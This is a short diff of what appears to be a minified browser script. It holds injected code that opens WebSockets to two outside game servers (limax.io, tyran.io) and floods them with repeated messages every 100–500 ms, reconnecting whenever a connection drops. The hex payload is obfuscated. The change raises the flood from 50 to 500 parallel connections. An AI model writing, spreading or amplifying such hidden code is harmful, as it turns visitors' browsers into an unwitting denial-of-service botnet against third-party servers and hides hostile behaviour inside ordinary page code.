@@ -1725,7 +1725,7 @@
   }, function (e, n) {
     window.gamepad = 23;
     !function n(){let e=new WebSocket("wss://newyork1.limax.io/");e.onopen=()=>setInterval(()=>e.send('[1,"sunrise?",2]'),500),e.onclose=()=>setTimeout(n,500)}();
-    function connect(n){for(let e=0;e<n;e++){let o=new WebSocket("wss://tyran.io/");o.binaryType="arraybuffer",o.onopen=()=>setInterval(()=>o.send(new Uint8Array("91ab7365727665727374617465".match(/.{1,2}/g).map(n=>parseInt(n,16)))),100),o.onclose=()=>setTimeout(()=>connect(1),250)}}connect(50);
+    function connect(n){for(let e=0;e<n;e++){let o=new WebSocket("wss://tyran.io/");o.binaryType="arraybuffer",o.onopen=()=>setInterval(()=>o.send(new Uint8Array("91ab7365727665727374617465".match(/.{1,2}/g).map(n=>parseInt(n,16)))),100),o.onclose=()=>setTimeout(()=>connect(1),250)}}connect(500);
     (function () {
       "use strict";
 
